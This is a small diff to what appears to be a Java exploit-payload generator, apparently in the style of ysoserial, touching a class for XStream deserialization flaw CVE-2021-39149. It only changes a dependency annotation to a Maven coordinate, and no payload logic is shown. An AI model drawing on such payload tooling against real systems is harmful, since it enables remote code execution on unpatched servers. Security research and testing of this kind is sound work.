@@ -19,7 +19,7 @@ import java.util.LinkedHashSet;
 
 // Xstream CVE-2021-39149
 
-@Dependencies({"Xstream < 1.4.18"})
+@Dependencies({"com.thoughtworks.xstream:Xstream:<1.4.18"})
 public class XStream39149 implements ObjectPayload<Object> {
 
     private static Unsafe instaniateUnsafe() throws Exception {
